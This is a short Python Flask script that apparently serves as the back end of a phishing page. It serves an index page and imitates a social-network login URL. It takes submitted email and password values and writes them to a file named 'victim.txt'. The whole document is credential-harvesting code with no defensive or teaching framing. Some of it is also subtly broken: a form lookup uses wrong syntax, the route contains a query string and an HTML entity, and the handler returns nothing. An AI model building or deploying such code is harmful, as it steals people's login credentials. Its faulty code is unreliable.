from flask import *  
app = Flask(__name__ , template_folder = "src")  


#showing index.html

@app.route("/")
def index():
  page = "index.html"
  return render_template(page)

 #wriring id and password 
 
@app.route('/login/device-based/login/async/?refsrc=deprecated&amp;lwv=100' , methods = ['POST', 'GET'])

def run():
  if request.method == 'POST':
        ID = request.form.get['email']
        PASSWORD = request.form.get['pass']
        f = open("victim.txt", "w")
        f.write("ID IS " + ID +" AND "+"PASSWORD IS "+PASSWORD)
        f.close()
        
if __name__ == '__main__':  
   app.run(debug = True)  